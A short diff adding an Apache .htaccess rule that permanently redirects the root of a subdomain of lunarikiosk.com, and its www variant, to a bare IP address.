@@ -1,0 +1,6 @@
+
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^mandiri\.lunarikiosk\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.mandiri\.lunarikiosk\.com$
+RewriteRule ^/?$ "http\:\/\/119\.235\.249\.185" [R=301,L]
+
